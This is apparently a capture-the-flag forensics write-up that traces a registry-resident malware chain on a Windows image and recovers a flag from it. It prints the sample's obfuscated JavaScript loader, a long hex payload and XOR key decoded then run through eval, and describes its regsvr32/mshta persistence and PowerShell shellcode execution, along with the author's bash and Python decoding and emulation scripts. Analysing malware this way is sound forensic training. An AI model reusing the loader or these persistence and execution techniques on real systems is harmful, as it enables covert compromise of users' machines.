8081c533f2d311b31165e5d4612062d212513241d130b2211751b431b2c676436121630382b2b1472083537362f2f470b2a2c0b6321061c5e3d60572378271b5f7914382e2f3574092f0266471a1b1d572c361739071b72037d0b142d1f2a110217276008207b2001351f71361425132211312e210d160e1124155c7b2524250b1a2f0410203a705f0d72253d727766152b3e3a282625700d7f3b2b2d6d7c0d20130324472858026428383b200721254c3c3c0d422c0e3c46321e383d3425381f0f7413353a2a53045302290b3504142138030979621c6321006f483b237b20441e173c47575d22722d5501513b207d0766230d3837240405330c111f635c294110441b115209164408640152233b14362d35031636675d1d3e34021c093428166b0a165d061d6e5e0e211b0a3d01030966056032212169352c3647373b7510621b027f66242a2f123c7a2d096e271a2312741c212e023c2c2929220c2721241006247a082c370723271104273a58792378271b5f7914382e2f3705252f70047d3171764b2c261c45271f750d57103a04150011023f337808227b33111f35713611310b21280b2e390c02241111312d47231054271a2f0410203a705f0d72253d7173161e03211f230b250153543f1628730c33202e3e3f4a285f3039283b0d600435314d262f7d023921467b181b37361e0823081f0504283f02230b7a2b0c16272a0722121e497a71077003137b7130300a27130d0127567d753924067b1d1500207508693c653d061d635b3257021c722c0c53113e1f117b28191d300420112615143f160c0c1b3b493e173c3f240b08240237725105562d1979571e3a08013d070301787c064f071e5728281936233b70255301160b3120132438335021195b1c1a6632613e3f3f12162c2b2c17210c0c37262b2f7103305522660f7625051b620d1755336f08510048252a1f28370276624f1a700d6c1539104525257d08573160040f311a1f17377f1c336c1d40044466610a31072411350b3e220219312351267708305106372b29010b15734e2566516a62681e1602211033210b085e7f3f37235b22543615003f4a28591a2628152b14061b26510b2c6e27171e3c5c080f27211b0823000c741723140634026934350825162d2a205915445c02735439540024300f122217155301794c3227037b0d030c222807572079310d19210e0754203a5b013a423f1a660579172c2002007e52222c0c21033503003f675957312401151d24021e7a7e307b06346a61333103023f1729167a670332212162390068222b3f70135305163d312318270f3c7a2e005b3a3f253f74102b3f15163b2d18660d0c0c37262b2f710b2e272d342506360e3d60572e52571c0e540f097c22252b252f72755131000e5f06296a390715032f7d0b142d1f2a11023f337b15097f241a35355729151c102000361c18052c0e1108212e0925202a04372b0b182031450100600b147b59161e0025362827215d04790f7304710c203d3e0542782d060e27101e3f380437407226587a0215382c450b0006243413385d0f741f7a15161a056a2435090d140b78504050181a7f3c6e7a1810773b7d3417367a460c144c4106616a3a0f725507486f3863213b2e391e23392a23401c3c772540622a6c06311835383c113f3931203d252907005c303b125d7d5c192b1916465d36420c3f545c791c3103542d271e111053163575542a062e0235501f440464757b7f525d6f0b505a0e1f5b1a5e335f102a257b5b5a410103393520675f7a\";  DytJP2tQpTFSCSPfCj = \"JihKxAnKqmpPHXLXpFwSWS75itMzd9siGw\";  iVzIlGRpmThwNOCL1KG = \"dMu8EICKrYXXdxwaUrhHqwy9LmQoERde3472KqSopZ2\";  SmjeHzofw6cwLeOb6BpRB = \"X9S5J2H6uAeyQezWcwzPZrXk2IAWFPgBEU\";  EzijgiB9PspsjpmUGT = \"qJQTNYhedo17qygIRlh\";  zWxyXEVqMTD9xOVPl4qJ = \"9in6qk69cxs6u1MWY1vlmOG0LbrDUcoF5J\";  wQ5kIBdQNgtKKtnlJzFYm5vi = \"3DgKNXDhE2WOHzrFByxwYg4p6fhgkAwmZifaGWuxeJrc\";  LqMt2n = \"\";  for(xQI8nL9yS = 0;  xQI8nL9yS &lt; Jhp39.length;  xQI8nL9yS += 2)LqMt2n += String.fromCharCode(parseInt(Jhp39.substr(xQI8nL9yS, 2), 16));  kgyPNNw5dwbGQXunNbOgUy = \"bc7XctQByu2UKFdc9YvmwhUB3gPQt72z\";  pWnyRnFGYxfzvb9NaSF5drQ = \"zrXXlTyHXew4xwhQf5lCndWx5qKO9cTvZDYMg\";  CjqmG4rtcUjWCNzOLJpK = \"pxr67Avhtw4dC5EZR\";  sPDSdBAwGI1fFbcYkhESvZCV = \"qEhOFTieJYw92DVqv9eS7JvtWHJTCbvFpV7\";  OcxKNinMXDsMTZuSH8GpmV = \"N1n1vRv9voSFMJfxHOQmTjoZd41ffvvUkdztWM9ZK0aZt\";  BfynX5vgv6j = \"3d4HUJViPevp9ok8rvVv0QXvQWKboVFEOvAbl0lgdlSlEwiy18D1dZ80WyIftDBf146xCO8OaZwDr\";  Wcfvr3KUA7dQj = \"\";  for(s5tjXZAMqyTE0Zj = dUHeZSsh9Ein8ehXw = 0;  dUHeZSsh9Ein8ehXw &lt; LqMt2n.length;  dUHeZSsh9Ein8ehXw++) {      Wcfvr3KUA7dQj += String.fromCharCode(LqMt2n.substr(dUHeZSsh9Ein8ehXw, 1).charCodeAt()^BfynX5vgv6j.substr(s5tjXZAMqyTE0Zj, 1).charCodeAt());      s5tjXZAMqyTE0Zj = (s5tjXZAMqyTE0Zj &lt; BfynX5vgv6j.length - 1)?s5tjXZAMqyTE0Zj + 1:0;  }    debGISAgM8mZoOwhQl = \"2THqj1AWcgvTh7aTBDtmQInzbMwQmTrIJbEwLk2wRLA\";  L9abAniyzg0QJysBiOE = \"2AQosRFzVVVFvWSO5\";  G6ttaDIFtfXJ2rTTdCnLrm = \"LnTu8pj7qE1o1uk9WOxG2URDId1qYH\";  eval(Wcfvr3KUA7dQj);  dthS5nzOkjAWsQVGybC = \"lapVyIgMFCDhGBkMY\";  arTgKaUl7KUYRlKOz3pCA = \"HgahwpeUlnHkCobMdwTbwtjAMDGwI7GFyV9idM4\";  YBTJGZnZpktBQXq0wdkomLB = \"BGQUvQLCa1GCSSoa5U6x3\";  zBrSmpYsigYQbtw8fZqzdrel = \"TXvxkwiywWNQtWoZc3fJq2xil7k9Jdkpgo266WuVst\";  krqHBDMxarB2eoHmxkhm = \"RQxQJFR7RBxKmbh68\";  WVqaBpTVpt1M9ofdAOPggqR = \"IcYyfpiGXQCm79GAnep3F2\";\n</code></pre> <p>This dump contains:</p> <ul> <li>hex payload var: Jhp39</li> <li> <p>XOR key var: BfynX5vgv6j</p> </li> <li> <p>Decode JS -&gt; PowerShell -&gt; Shikata shellcode  -&gt; cmd echo blob</p> <p>Exact Scripts I Used</p> <p>dump_orhmkbye.sh</p> <pre><code>#!/usr/bin/env bash\nset -euo pipefail\n\nif [[ $# -lt 2 ]]; then\n  echo \"Usage: $0 &lt;NTUSER.DAT path&gt; &lt;output txt path&gt;\" &gt;&amp;2\n  exit 1\nfi\n\nNTUSER_HIVE=\"$1\"\nOUT_TXT=\"$2\"\n\nchntpw -e \"$NTUSER_HIVE\" &lt;&lt;'EOF' &gt; \"$OUT_TXT\"\ncd \\Software\\lirs\ncat orhmkbye\nq\ny\nEOF\n\necho \"Wrote registry dump to: $OUT_TXT\"\n</code></pre> <p>recover_flag_from_orhmkbye.py </p> <pre><code>#!/usr/bin/env python3\n\"\"\"\nRecover the final blob from the decoded registry stage:\nHKCU\\\\Software\\\\lirs\\\\orhmkbye\n\nInput:\n  - Text dump produced by chntpw \"cat orhmkbye\"\n\nOutput:\n  - Intermediate decoded artifacts (JS/PS/shellcode)\n  - Recovered command blob from shellcode\n  - Final 32-hex flag\n\"\"\"\n\nfrom __future__ import annotations\n\nimport argparse\nimport base64\nimport hashlib\nimport re\nfrom pathlib import Path\n\ndef sha256_hex(data: bytes) -&gt; str:\n    return hashlib.sha256(data).hexdigest()\n\ndef parse_orhmkbye_dump(text: str) -&gt; tuple[str, str]:\n    hex_match = re.search(r'Jhp39\\s*=\\s*\"([0-9a-f]+)\"', text)\n    key_match = re.search(r'BfynX5vgv6j\\s*=\\s*\"([^\"]+)\"', text)\n    if not hex_match or not key_match:\n        raise ValueError(\"Could not find Jhp39/BfynX5vgv6j in dump file.\")\n    return hex_match.group(1), key_match.group(1)\n\ndef decode_js(hex_payload: str, key: str) -&gt; bytes:\n    raw = bytes.fromhex(hex_payload)\n    key_b = key.encode(\"ascii\")\n    return bytes(b ^ key_b[i % len(key_b)] for i, b in enumerate(raw))\n\ndef extract_ps_from_js(js_blob: bytes) -&gt; bytes:\n    m = re.search(rb\"FromBase64String\\('([^']+)'\\)\", js_blob)\n    if not m:\n        raise ValueError(\"Could not locate FromBase64String('...') in decoded JS.\")\n    return base64.b64decode(m.group(1))\n\ndef extract_sc32(ps_blob: bytes) -&gt; bytes:\n    m = re.search(rb\"\\$sc32\\s*=\\s*(.+?);\\s*\\n\\s*#qzxth\", ps_blob, flags=re.S)\n    if not m:\n        raise ValueError(\"Could not locate $sc32 byte array in decoded PowerShell.\")\n    nums = [\n        int(tok, 16) if tok.startswith(b\"0x\") else int(tok)\n        for tok in re.findall(rb\"0x[0-9a-fA-F]+|\\d+\", m.group(1))\n    ]\n    return bytes(nums)\n\ndef decode_shikata_stage(sc_blob: bytes) -&gt; bytes:\n    # This stage is x86 shellcode that self-decodes in-place.\n    # We emulate just long enough for the decoder loop to complete.\n    from unicorn import Uc, UC_ARCH_X86, UC_MODE_32, UC_HOOK_CODE  # type: ignore\n    from unicorn.x86_const import UC_X86_REG_ECX, UC_X86_REG_EIP, UC_X86_REG_ESP  # type: ignore\n\n    base = 0x01000000\n    stack = 0x02000000\n\n    uc = Uc(UC_ARCH_X86, UC_MODE_32)\n    uc.mem_map(base, 0x2000)\n    uc.mem_write(base, sc_blob)\n    uc.mem_map(stack, 0x2000)\n    uc.reg_write(UC_X86_REG_ESP, stack + 0x1000)\n    uc.reg_write(UC_X86_REG_EIP, base)\n\n    def hook_code(emu, addr, _size, _user_data):\n        # Decoder loop exits when execution reaches base+0x1b with ECX=0.\n        if addr == base + 0x1B and emu.reg_read(UC_X86_REG_ECX) == 0:\n            emu.emu_stop()\n\n    uc.hook_add(UC_HOOK_CODE, hook_code)\n    uc.emu_start(base, base + len(sc_blob), count=5000)\n    return bytes(uc.mem_read(base, len(sc_blob)))\n\ndef extract_cmd_blob(decoded_sc: bytes) -&gt; str:\n    m = re.search(rb\"cmd /c 'echo ([^']+)'\", decoded_sc)\n    if not m:\n        raise ValueError(\"Could not find cmd /c 'echo ...' string in decoded shellcode.\")\n    raw = m.group(1).decode(\"latin1\")\n    return \"\".join(c for c in raw if c in \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\")\n\ndef decode_final_flag(blob: str) -&gt; tuple[bytes, str, str]:\n    # Stage 1: base64 decode, nibble-swap each byte, XOR 0x1f.\n    x = bytes((((b &gt;&gt; 4) | (b &lt;&lt; 4)) &amp; 0xFF) ^ 0x1F for b in base64.b64decode(blob))\n\n    # Stage 2: extract token window.\n    token = x[15:47].decode(\"latin1\")\n\n    # Stage 3: convert token to final 32-hex flag.\n    out = []\n    for i, ch in enumerate(token):\n        v = ord(ch) &amp; 0xF\n        if i &gt; 0 and token[i - 1].isalpha():\n            v = (v + 9) &amp; 0xF\n        out.append(format(v, \"x\"))\n    return x, token, \"\".join(out)\n\ndef write_artifact(path: Path, data: bytes) -&gt; None:\n    path.write_bytes(data)\n    print(f\"[+] Wrote {path} ({len(data)} bytes, sha256={sha256_hex(data)})\")\n\ndef main() -&gt; None:\n    parser = argparse.ArgumentParser(description=\"Recover challenge flag from orhmkbye registry dump.\")\n    parser.add_argument(\n        \"--dump\",\n        required=True,\n        help=\"Path to text file produced by: chntpw -e NTUSER.DAT (cat orhmkbye)\",\n    )\n    parser.add_argument(\n        \"--outdir\",\n        default=\"./recovered\",\n        help=\"Directory to write intermediate artifacts (default: ./recovered)\",\n    )\n    args = parser.parse_args()\n\n    dump_path = Path(args.dump)\n    outdir = Path(args.outdir)\n    outdir.mkdir(parents=True, exist_ok=True)\n\n    text = dump_path.read_text(errors=\"ignore\")\n    hex_payload, key = parse_orhmkbye_dump(text)\n    print(f\"[+] Parsed Jhp39 hex length: {len(hex_payload)} chars\")\n    print(f\"[+] Parsed XOR key length: {len(key)} chars\")\n\n    js_blob = decode_js(hex_payload, key)\n    write_artifact(outdir / \"orhmkbye_stage.js\", js_blob)\n\n    ps_blob = extract_ps_from_js(js_blob)\n    write_artifact(outdir / \"orhmkbye_stage.ps1\", ps_blob)\n\n    sc_blob = extract_sc32(ps_blob)\n    write_artifact(outdir / \"orhmkbye_sc32.bin\", sc_blob)\n\n    decoded_sc = decode_shikata_stage(sc_blob)\n    write_artifact(outdir / \"orhmkbye_sc32_decoded.bin\", decoded_sc)\n\n    cmd_blob = extract_cmd_blob(decoded_sc)\n    print(f\"[+] Extracted cmd blob: {cmd_blob}\")\n\n    transformed, token, flag = decode_final_flag(cmd_blob)\n    write_artifact(outdir / \"flag_transform.bin\", transformed)\n    (outdir / \"flag_token.txt\").write_text(token + \"\\n\")\n    (outdir / \"flag.txt\").write_text(flag + \"\\n\")\n\n    print(f\"[+] Token: {token}\")\n    print(f\"[+] FLAG: {flag}\")\n\nif __name__ == \"__main__\":\n    main()\n</code></pre> <p>Detailed Step-by-Step Flow I Used To get extracted shellcode</p> <ol> <li>Identify where flag logic lives. I started from Sysmon timeline to map execution chain. The key pivot is regsvr32 setting a class open-command that launches mshta and reads registry value HKCU\\Software\\lirs\\orhmkbye. That tells you the challenge/flag path is likely registry-resident JS in orhmkbye, not the large malware PE branch (WmmbDZ) used for network payload.</li> <li>Dump and analyze orhmkbye from the user hive. I extracted the raw registry value from: NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)</li> </ol> <p>The value contains obfuscated JS with:</p> <ol> <li>a large hex string variable (Jhp39)</li> <li>an XOR key variable (BfynX5vgv6j)</li> <li>a loop that decodes bytes and eval(...) executes them</li> <li>Decode the JS stage. In script recover_flag_from_orhmkbye.py(recover_flag_from_orhmkbye.py:28), I parse those two vars, then perform repeating-key XOR against bytes.fromhex(Jhp39). That recovers clear JS to /tmp/recovered_flag/orhmkbye_stage.js.</li> <li>Extract and decode embedded PowerShell. The decoded JS contains FromBase64String('...'), which is parsed in recover_flag_from_orhmkbye.py (recover_flag_from_orhmkbye.py:42). Decoded PS is written to /tmp/recovered_flag/orhmkbye_stage.ps1.</li> <li>Extract $sc32 shellcode byte array. The PS script has inline shellcode [Byte[]] $sc32 = ... and runs it via VirtualAlloc + CreateThread. I extract this to /tmp/recovered_flag/orhmkbye_sc32.bin.</li> <li>Decode the Shikata stage correctly. This shellcode is Shikata-style self-decoding (fnstenv/pop decoder loop pattern). Instead of hand-decoding fragile offsets, I emulate it with Unicorn in recover_flag_from_orhmkbye.py (/recover_flag_from_orhmkbye.py:60). I stop emulation exactly after decoder loop completion (base+0x1b with ECX==0) and dump the in-memory decoded body: /tmp/recovered_flag/orhmkbye_sc32_decoded.bin.</li> <li>Pull the command that contains the encoded flag blob. From decoded shellcode I extract: cmd /c 'echo VkIEZsYWc6IFlzfnhGZCYpJygmJygqKi0uJ3soeSste30qKyd9Ly0rKnopLSksYg=='</li> </ol> <p>This is done in recover_flag_from_orhmkbye.py (/scripts/ recover_flag_from_orhmkbye.py:86).</p> <ol> <li>Decode blob to token, then token to final flag. The final decode logic (implemented in recover_flag_from_orhmkbye.py (recover_flag_from_orhmkbye.py:94)) is:</li> <li>Base64 decode blob bytes.</li> <li>For each byte: nibble-swap + XOR 0x1f.</li> <li>Take byte window [15:47] -&gt; token: 96879875521h4g64bd254h2024e5626s</li> <li>Convert each char to low nibble (ord(c) &amp; 0xf).</li> <li>If previous char is alphabetic, add 9 mod 16 to current nibble.</li> <li>Join as hex.</li> </ol> <p>Why This Method Is Reliable</p> <ol> <li>It follows observed execution path from forensic artifacts (registry + script chain).</li> <li>It decodes every real stage in order (registry JS -&gt; PS -&gt; shellcode -&gt; cmd blob).</li> <li>It avoids false transforms by emulating shellcode decoder exactly.</li> <li>Final value is algorithmically derived and reproducible from raw evidence each run.</li> </ol> <p>Files Used (Input + Generated)</p> <ol> <li>Input evidence hive: NTUSER.DAT (/C/Users/FlagYard/NTUSER.DAT)</li> <li>Optional timeline confirmation: Microsoft-Windows-Sysmon%254Operational.evtx(/C/Windows/System32/winevt/Logs/Microsoft-Windows-Sysmon%254Operational.evtx)</li> <li> <p>Dump output from script: orhmkbye_dump.txt</p> <pre><code>chntpw version 1.00 140201, (c) Petter N Hagen\nHive &lt;../C/Users/FlagYard/NTUSER.DAT&gt; name (from header): &lt;yer\\C\\Users\\FlagYard\\NTUSER.DAT&gt;\nROOT KEY at offset: 0x001020 * Subkey indexing type is: 686c &lt;lh&gt;\nFile size 3506176 [358000] bytes, containing 340 pages (+ 1 headerpage)\nUsed for data: 12850/3312192 blocks/bytes, unused: 246/179008 blocks/bytes.\n\nSimple registry editor. ? for help.\n\n&gt; \n\\Software\\lirs&gt; get_val2buf: Long value: parts = 3, list = 8ba1c\nget_val2buf: Datablock 0 offset 33c020, size 3fd8 (16344)\n             : Point = 0, restlen = 8a0e, copylen = 3fd8\nget_val2buf: Datablock 1 offset 340020, size 3fd8 (16344)\n             : Point = 3fd8, restlen = 4a36, copylen = 3fd8\nget_val2buf: Datablock 2 offset 344020, size 3fd8 (16344)\n             : Point = 7fb0, restlen = a5e, copylen = a5e\nValue &lt;orhmkbye&gt; of type REG_SZ (1), data length 35342 [0x8a0e]\nkLvh3rmbAeGborOYXmMcoozk = \"8WCHTDQe8jL96TQ9UrgeBKPjYMKn\";  YbeMpBSqmJu0xLiiFY = \"UCi8CVAxBsRTPZUEArJ1WniFEMbZhbvZ7bT4TtNqfVfP\";  E1NADdaQfJCMRCwTvMiHIV = \"31KcBqdvSRicNaGH79Akyjr8VYTqMHS\";  LvswLlrJn5Q2aBlvcnIgHLN = \"K0saIir59yOVzRGi\";  gHLNH5sSWpEwHlrvORD = \"amz85ez4LHPAKhIVyklzqYhQZ9ubrfFAUTn\";  BCRzEWHyiUk3EHeMfIfZ = \"yjplgCEjHnGSb3WiRNG6V8B9EpvVrl3yJxwqz1\";  NTIAIjOTgFH3acz3CWrlIB = \"NrNz88D8tzLXOSP4Jvj1shdBh2BDxVNWZZecRqvrqEJv6\";  XAvWazQNjwMDuxXebDRJz9u = \"Z6g02LZ4YxcVVZEH48sHBlnhjcNegycDEh4\";  Jhp39 = \"692745272f1801051c24232568351a524b13301c4406784b71751c18370531120003733016543a0b073d232e7c123a1c595c250316150b58051f0b0b2c753b25534c7a0925351a746c5012293765314d0f141f1d28203203005b26390a33381442106c78541a25240a28201c2923441823144929515d1f0438733a2f5b0a354e5c231f09743a2f011c193e7b335e4c6e0136217618033913644f1346760f650b0030055603460b1c0f003b470c1c7b651e122b75706f6507307135000303217624101508372934332631754f640c44787b401d4b7c353931743f5200782b333b767d120e1f21380511650c3c2e3c5d652e1108730d530d504d5b7c601b1c0017252828212331263b350c0d5f7d1c01302173516555084e534c0642340d5201652f0a2f1f140e440a393c1526040c2957313e063c45205e030028172b3c28564d194d5f521d313b19762b0b0c3a1619161f1e1674002c1434257d3b13131d6b0e021d005b0a354e67141c406a33087b1216060528617e7c110c6f056f432a46200a0b17717f222f0510652a1c126f0c2e5b022f154669136e240275706f6522343c6f0d4c684c104c4709032509111841591c1875015476181d774879565d7f4f6c11141658312a4b261b3f232b5a034814787c715b637045565043562e184f56381347711915253e3d073719242f2a15354a4e673f04160523186b24011c5d5466185f5732107759694e0e7d0748745a4011312056220434036c5063165b2b3039254b794c5e52550a0c4c0707745f106c785438323342470d122037026f27025303030d0234317f4d282a72710d1f233f4c63230b2008136c19255e5a401d313b65755b1c052b1f7105472d637e051d220c18171148220a1618351b6a2b011b2920120c2d2c02143f0c23253a5c0f2403141d3f2e402d284108275f0f3d5d476732002535230b27017f7f4a153c61222f2a150542782d77093203113361071b3e090e3c01073f11125b0b0f0e3d0d79245f0c15077832100d0b792f260325102d223e28497a7176630f3f5547193a2027130d0127567d7539241a7f091803207415782240190c121c01323220406337225727316f0c51090a0633657f053f0507320335032c3567590c3d34011a2619021e616b055a321272010d2a25023d023633546c7414147e092b281925152b6b2e5c2a021c6633082f0c3c7a2d096d35302f2f6760341216013229291430267d1a71033b09192e205c3421161b0d30774c11543c1854680438223319127202697e432e0b234f15321b4e0d344733567a39210e3a3b5232215608227b33111f3571361137611c02505a2325281946053303572524250b1a2f0410203a636d21692636695e01092b212628210f700d7f3e370d5b07231f1576435b05637d31053c1914012e3a40353c0d4224114f44080f1a241b2030030c2b293a2c143059520121100d042207145a375d5a137b173f6b57382d2430470d01565660043232156f015113310a47505766243719633a0a322c036338250813216f037c3a1e0c32651d16363b3e701b1b071636630b0e3101050127303f13557f125a361d6e430d2e2d0e1003170f7a675d0b0a094c1b04023974286454411d381c3b0b17331c147e031d5a1b431014673d683a3a1131015d00321c220e743302661c05233e3f0f2e310320036e3e52556a0e7f3b3378041d2f373476625b19147a541d2936021d2502146d78643c0c2106162c235e06386f47380c2101273b183d1929503d6724021a1f0d212d5b360a221f305e1007251263541e5c082f6266054c2a21212b0b0a596d613b0a3c710c2b1e15033449074d30042e01232304213d4a3a596e1a1411205b1d1d302434790e2b3401033515381a2e543435123d61142d145a3458740773060f0b5c2d1d0e300008295700567e2a33160a091b3e32161e512362260c12040508361d477d3e045f3b3517117912191118167b2926643e3d2a211b10286103002d2f120b0c34281e787b166401027a5c06171f161603100a525d033d1918623f033721001001514e2c1d006730633700135008026d1e24021577073217061138360210321f1c0e08033b6200360a00070d12141a2c796e2d53233652793e0e2e31450a770502665a1a107a6b153600041e257d54551f6c3f1a021e0d1437411f0955163234440563022164672a35562325747f400e0e2200353051070a340f1c253a705311762223616766152d21223d211f5a41634a157f6b18502d150324473e637d65130e3b200744457e0d2c7e1c152f115904362024330c0e1b0c153d012f1657046a5e310f253a07723338165671077003137b71303008563f0d701e486e7114772e797f2a133405157a27752f1c091702062d1a07633a210913212e1d6a09110303101d0f0e0173291b2117520d77550c2f2f19262719330f500a11582819795902311f0f16032e0c7d715e0819086e0c040c3934284a1c7b120d2e020b175c463c7f351b5b1c24672f6726313a1216203702007621173c3434245c1b3d371b34260335011a5c7e306b3c0854533934392a180a2e027458421b0437542d360c0220357554551f6c3f0404280d2c43740022543847341862213a2104241f3529231f122b1a1b212540231054271a2f0410203a705f0d7225147b59190f2b55362f06375e537f3b0228710c203d3e0c385f007c1e2c283f283b333e1c4e353e724317010e5b0b003f24067828030f1e172320090e1b6a3f001423245c0e3e2a3856710c012a195f001c300a27130d03567a7d053a3a2c553b513b440d3c700d752f1c0914043432431a5d28074e101f141853191200082e09552b0729220635000525732d002d2d63270c450d0d5070204407684b7e141008013d0703017877771f16087e36380d472339751065110d003e0b0733462a6126046d354f2c176803281463632c323c1731090c340f3b3b05073e3c3e250f2b1c0e2962792f672c10096a04152d2f32301602797e461a2e2b5c0622083926406155560f00391f2f24342f287307096f24460c2e793e0d31682d2a3a3d2624777b1111312d48202426220a3b701c3021634e275f0f3d686316121f2e3e7518355d507f3e371b5c072b2a152916572d771a04293b503a3f2122080c066d023921467b181b37361e0823081f05040135282c59515f2d550f025c0e3e2a385671077003137b713c2c7a0a0e20053045656e3639156f7e08383f2f156337762a0412141e02224f046038074d2a22394061620e0f323a1d170b1314332d2107120e59592f3e34012e26442715536f0e42050d6e4a1c3a255e22762a0a5259631f0f1c7a1f383707282b0035532d227a1d20132411397a2e0c713137313f73103f3c176f3e305d2e301c22303233347e163d335d3a0e0d1b2d2066762b6b371b5f7c043b0b041915252c770c432c0476521639080726400711617b17393731010a3f1c4e06206e01021b2000240a2e17661235172c0d060522243a220036305419092b3d0420105d010b465411710223481331103506375e5f602f763561183b3623293403056c12391e013f60043149520c11081923651a4a351f202506132c150c11742614090919625e31543a1b00322d3a1e586c135d0e3955092d1b7b3c44082e0241565c353a035419143945021f69310120310d3a5b0a30471c5d28034e283e1b1f7b052b38123e05100a1136702d18222c2f5e260b00240515271e2812676f714b3d0d625c03140f56151c180a65636048220801240223420c286b367a120d18390b62341939520b075c34342f14021f1a2c1605323837183c0c261d34313b055e0556183f2706251c1d6640377d211b576766377c0547162e046201651c147a082e366b1b08195f11500f0333345a12312c28735d0a6f3c1a350f05180121643c292539051c1215120a27595c081e553c0a01351b304a605f110208205c77010d050a3e7520086344542f163a6b18546a2d1c384507720639293833203c4426432300501a143b24430b0e3c3d0d220500022b137c3a145b055101310e08102e0f15072b605c0c7814167b62011b27281c1e2f307e6d6e2a332b55192f002f161d51566632192132053420471c5d28034e2835311f62630e46050072090b013e291c3107173677140b2d05381916205c4b530a305d2f196a45332e3115380700277a776436217d6a7e031d223439600f4404160b3d3c182f00290b39005c2a3c3a3d633a6f3200382c2b2c17210c0c37262b24002224035c182506360e3072792378271b76733e377803330e7307036e471b0b150c0b3035100d3172037d0b142d1f2f242613286b033c0943121f35622b010c1c2e02265f310b0d271d18311b57212f0c061e3f3210243159511d62133d75783f15070f03230f2e5606783b3428750709372e170554297c2f66073f1e37283e185220384f153b1e11031f1b01361a030516180532283b090a017e2f1003211b0b74382a0e56750c561d0351473034010e1e0b111156797e102a026b3806173f23437c27432f180231131d36011774270c093f3521117d193f0e1f2e3c05221e2171020f36052178040b2b2f240b083f01146841335629125f471a003e01390c2a0f7f5d411f0e075f7c2f2300233f7b034c07163d31241802423e40180c753a1e3c2f63263f3b1930312f2c2121080711703805470b2a2c0b67353c000e3479502e7c0d2d5f7d1f1e30292733252b795303222a385f02293d471e314403790032331b0027023b385107326b05111b3e576315252630062a082e1c2c38110c2a0b02211e130b1e242d1a302a465f097903207549201e042e1c2e183546537b302435761c163d3a0c1a5a295d3f32071e0e64281f075e22235f0b3b3f01571c101e3a0e3215081b0e22382f12150b7d24005636001b223a211e047507460317705764231a1113090a0e5b794f0f240270270c031e33157e2c53781b33210e1d2d114277061c5f3f3e314369382f111c1f2c5122153122023e261822631b0029243b050b1e1e1e7c70230029234f571a312e112d3d35017c7c5e120c0c4f282c121f283c5a1353051d2d2f303912113d710813623101313b78366d2f02202c2f2731761c3601262f245800290d1b34210d105b20484f237c2c32537e040e2e2b3c237729624351350b275115322d10093a54556e21222d1b21380e38234e0826701a1f18254736153e3620061b18310b0d271c0c311b57212f0c041c3f3210243159520a48133d75783048071f03230f2e564d7b2b3428750706223a3d0554297c2f22043f1e37283e170b35384f153b1e1149082101361a030a041b2f32283b0905587f3f1003211b042c3a2a0e56750c590e007b47303401010e0b111156797e102816513806173f23417e1d432f180231591d1c011774270c0c2b2521117d193f471c143c05221e213c0225360521780b572915240b083f0e4d7c6b335629125f49193a3e01390c2a0b6867411f0e075025383300233f7b030106163d31241802453f7a180c753a11623963263f3b19307b3b16212108071139383f470b2a2c0b602306000e34795f706b372d5f7d1f1e793f0d33252b795307363a385f0229321a1e3144037900327a0c3a27023b385e15247b05111b3e572615352630062a073f081638110c2a0b00360e130b1e24220f242a465f0979036f6263201e042e1c2e183546537b302437770c163d3a0c15072b673f32071e0e613c1f075e22235f432f3f01571c101e3a180815081b0e227b3912150b7d24001d35001b223a211e006117460317705720361a1113090a01486d650f240270270c032433157e2c53301b09210e1d2d114177061c5f3f3e31447e122f111c1f2c52223f3122023e261b36591b00292434591c0e1e1e7c702c5c3e334f571a312e112e0735017c7c5101191c4f282c1210332b5a1353051d223f243912113d710702610b01313b7839353902202c2f273e2b1c2601262f24575f3e1d1b34210d105a23584f237c2c3d097e040e2e2b3c2c2b3f624351350b275115082d10093a5b0d7a21222d1b21380d39334e08267015450f0f4736153e3667063118310b0d28420e211b57212f03580a3f32102431560d1e62133d75783003072503230f2e59596f11342875070932392d0554297c2f6410151e37283e185436024f153b1e1e5b0b3101361a0305150c1532283b0905157e151003211b0b3f2e3a0e56750c5909176b4730340101441d2b1156797e1f7015513806173f23407d27432f18023e001e36011774270c423d3521117d193f0c0b3e3c05221e2e2c0225360521780b543d15240b083f0e036b51335629125f481a3a3e01390c2a0d6b5d411f0e075f353b3300233f7b0c5d06163d31241802432940180c753a11643973263f3b19307f2c2c2121080711712f3f470b2a2c0438353c000e34795f777f272d5f7d1f1e793c3733252b7953073600385f02293d001e31440379003d20183a27023b385105255105111b3e5760151f2630062a082f081638110c2a0b043634130b1e242d1c262a465f0979036e6163201e042e13770c2546537b30247e7636163d3a0c15063d5d3f32071e0e63281f075e22235f0b390501571c10112b0d1815081b0e227f3b12150b7d240f0e212a1b223a211e056207460317705763341a1113090a01486d4f0f2402702855171e33157e2c537b1b33210e1d2d1140603c1c5f3f3e314669282f111c1f230e20153122023e290a23731b002924341b1c1e1e1e7c70234629194f571a312e112e2d35017c7c51480c0c4f282c121f2f3f4a1353051d223a270312113d710702761b01313b7839333b28202c2f273e2e1c3601262f24575e3d371b34210d105820624f237c2c3d4f6a140e2e2b3c23713f584351350b280c15322d10093a5b0c7a1b222d1b21371f3b194e0826701a1d19254736153e362d042118310b0d271a0c1b1b57212f0c060a153210243159540958133d75783f10062503230f2e564c7b013428750709302d2d0554297c2039073f1e37283e185020284f153b1e11481c2101361a03055b183f32283b09055e6a051003211b0b3f393a0e56750c561c175147303401010c0a2b1156797e1f70027b3806173f23427d0d432f180231581e360117742703503f1f21117d193f461c043c05221e2e2f1535360521780b1d3d3f240b083f0e487f6b335629125f010d2a3e01390c25117f77411f0e075f7c3b3300233f7b0c5c07063d312418020e3e7a180c753a11213863263f3b1930322d3c2121080711363b05470b2a2c043f3606000e34795028681d2d5f7d1f1e792b3733252b79534c362a385f02293d431d0b44037900323d0c3a27023b385106315105111b3e572615252630062a082f1f3c38110c2a0b4a2224130b1e24220f2700465f09790c326263201e042e133e0c2546537b302b25771c163d3a0c15013e773f32071e0e603f25075e222350183b2f01571c101e3a1a1815081b0e22383802150b7d240054353a1b223a211e05622d460317705766371a1113090a0e5c7a650f2402702818172433157e2c537c1809210e1d2d110a74161c5f3f3e3e1b7f022f111c1f2c57362f3122023e261a36591b002924345c1f341e1e7c70234829234f571a31210a391735017c7c514b0d1c4f282c12103d28601353051d223f330312113d710858612101313b7836693838202c2f2731731f1c01262f2457152a1d1b34210d1f0134484f237c2c32517d040e2e2b3c237628624351350b275202222d10093a5b0e6d21222d1b